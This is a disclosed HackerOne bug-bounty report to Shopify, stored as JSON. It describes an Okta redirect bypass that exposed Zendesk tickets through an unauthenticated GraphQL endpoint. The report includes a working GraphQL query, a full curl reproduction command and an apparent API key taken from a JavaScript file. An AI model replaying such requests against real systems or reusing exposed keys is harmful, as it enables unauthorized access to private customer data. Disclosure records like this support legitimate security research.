@@ -1,0 +1,158 @@
+{
+  "id": 397130,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zOTcxMzA=",
+  "url": "https://hackerone.com/reports/397130",
+  "title": "Unauthenticated access to Zendesk tickets through athena-flex-production.shopifycloud.com Okta bypass",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2018-08-20T00:14:05.542Z",
+  "submitted_at": "2018-08-20T00:14:05.542Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "rijalrojan",
+    "url": "/rijalrojan",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/fBoPSSRSdMDTghBJexdu4AwG/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 1382,
+    "url": "https://hackerone.com/shopify",
+    "handle": "shopify",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/d9695107bfcd68eeb1c9e0912b109cdae9a6c00c0bda6fd4cbd6d9bdb828840a"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Shopify",
+      "twitter_handle": "",
+      "website": "https://www.shopify.com",
+      "about": "Shopify is a multi-channel commerce platform that helps people sell online, in-store, and everywhere in between."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2018-09-19T16:15:49.202Z",
+  "bug_reporter_agreed_on_going_public_at": "2018-09-19T16:15:48.930Z",
+  "team_member_agreed_on_going_public_at": "2018-09-19T14:53:56.702Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "**Summary**\n\nathena-flex-production.shopifycloud.com seems to be an internal system that Shopify uses because it redirects user to Okta login. During this however, I noticed that it first returns 200 and then does a redirect meaning some part of the website loads before redirecting. With this, I was able to get the JS being used in the system. Through the JS file, I found a path that allows GraphQL queries thus resulting in a full dump of Zendesk ticket information. \n\n**Description**\n\nWhen you originally go to athena-flex-production.shopifycloud.com you will find that it will redirect to Okta. However if you do `view-source:athena-flex-production.shopifycloud.com` in Chrome, it will show that the website loads momentarily. In one of the script src, there is this link requested by the website: \n\nhttps://cdn.shopifycloud.com/athena-flex/assets/main-3fe2559f5e86bcc7d88fe611b71942faa73e787afbc2126a601662ab254a36fc.js\n\nWhen you beautify the JS file you will notice it has some query data that can be used at the /graphql endpoint. After I got this, I started to play around with the GraphQL schema and see what I could gain access to. \n\nFor my test I sent: \n\n```\n{\"query\": \"query getRecentTicketsQuery($domain: String) {\\n    shop(myshopifyDomain: $domain) {\\n      zendesk {\\n        tickets(last: 5) {\\n          edges {\\n            node {\\n              id\\n               requester {\\n                name\\n              }\\n              subject\\n              description\\n              }\\n          }\\n        }\\n      }\\n    }\\n  }\\n\",\"variables\":{\"domain\":\"ok.myshopify.com\"}}\n```\n\nWhat this query says is: Return last 5 tickets with description, reporter name and subject of the ticket that contain domain ok.myshopify.com. Once the query was done, it responded with 9,259 bytes of JSON response that contained extremely critical data. \n\nI don't want to paste the data here for obvious reason but I am attacking the file here so you can delete it by contact support@hackerone.com later if you wish to disclose the report. \n\n\n**Reproduction**\n1. Send the following curl request: \n\n```\ncurl -i -s -k  -X $'POST' \\\n    -H $'Host: athena-flex-production.shopifycloud.com' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Content-Type: application/json' -H $'Connection: close' -H $'Upgrade-Insecure-Requests: 1' -H $'Content-Length: 422' \\\n    --data-binary $'{\\\"query\\\": \\\"query getRecentTicketsQuery($domain: String) {\\\\n    shop(myshopifyDomain: $domain) {\\\\n      zendesk {\\\\n        tickets(last: 5) {\\\\n          edges {\\\\n            node {\\\\n              id\\\\n               requester {\\\\n                name\\\\n              }\\\\n              subject\\\\n              description\\\\n              }\\\\n          }\\\\n        }\\\\n      }\\\\n    }\\\\n  }\\\\n\\\",\\\"variables\\\":{\\\"domain\\\":\\\"ok.myshopify.com\\\"}}' \\\n    $'https://athena-flex-production.shopifycloud.com/graphql'\n```\n\n**More information**\n\nThere is also an API key that I found on the JS file. I think this might be the Zendesk api key but I am not yet sure: \n\n```\nR = n.n(O)()({\n apiKey: \"5c0246635b3c77189888c0b10d3427ac\",\n notifyReleaseStages: [\"production\"],\n releaseStage: \"production\" \n}),\n```\n\n## Impact\n\n1. Get ticket description means dumping any detail you want. \n2. Creating zendesk ticket in behalf of other agents. \n3. Changing state of other tickets. \n\n**I will post list of all functions that is possible in this graphql.**",
+  "weakness": {
+    "id": 27,
+    "name": "Improper Authentication - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 61,
+  "voters": [
+    "pajoda",
+    "n1m0",
+    "drsniper",
+    "mashoud1122",
+    "proabiral",
+    "bogdantc",
+    "nikitastupin",
+    "ali",
+    "tess",
+    "sameerphad72",
+    "and 51 more..."
+  ],
+  "severity": {
+    "rating": "critical",
+    "score": 9.8,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "none",
+      "scope": "unchanged",
+      "confidentiality": "high",
+      "integrity": "high",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 422,
+    "asset_type": "URL",
+    "asset_identifier": "partners.shopify.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "id": 10619,
+      "category": "team",
+      "content": "@rijalrojan discovered an application and endpoint under `athena-flex-production.shopifycloud.com `that exposed metadata and contents of our Zendesk tickets. Within a couple hours, we had put it behind an OAuth portal to mitigate the issue. After an internal investigation revealed no evidence of malicious access to the data, we rewarded him with the highest bounty available under our non-core authentication bypass category ($5,000). We did this despite the app being out of scope because of the severity of the information disclosure. As always, out-of-scope rewards are at our sole discretion.",
+      "updated_at": "2018-09-19T16:33:51.760Z",
+      "can_view?": true,
+      "can_create?": false,
+      "attachments": [],
+      "user": {
+        "id": 164342,
+        "username": "jack_mccracken",
+        "name": "Jack McCracken",
+        "bio": "",
+        "cleared": false,
+        "verified": false,
+        "website": null,
+        "location": "",
+        "created_at": "2017-05-01T15:33:44.372Z",
+        "url": "https://hackerone.com/jack_mccracken",
+        "hackerone_triager": false,
+        "hackerone_employee": false,
+        "user_type": "company",
+        "profile_picture_urls": {
+          "small": "https://profile-photos.hackerone-user-content.com/variants/000/164/342/6543dc397b4dbb2c24dc81f92a42de654a3e6a99_original.jpeg/c8a1698ff707a5e3e8a91a3484838363845daac68cb82c86d55c9e2d44d67b67",
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/164/342/6543dc397b4dbb2c24dc81f92a42de654a3e6a99_original.jpeg/74790fe75ac5dbe8a5140a122388d59ebac913dcfa941f0b3a45e6cad161f9ea",
+          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/000/164/342/6543dc397b4dbb2c24dc81f92a42de654a3e6a99_original.jpeg/fba683f28d17594d98b39d87e2b3aa09acb938c22d49b206f663ae961dc39adc"
+        }
+      }
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
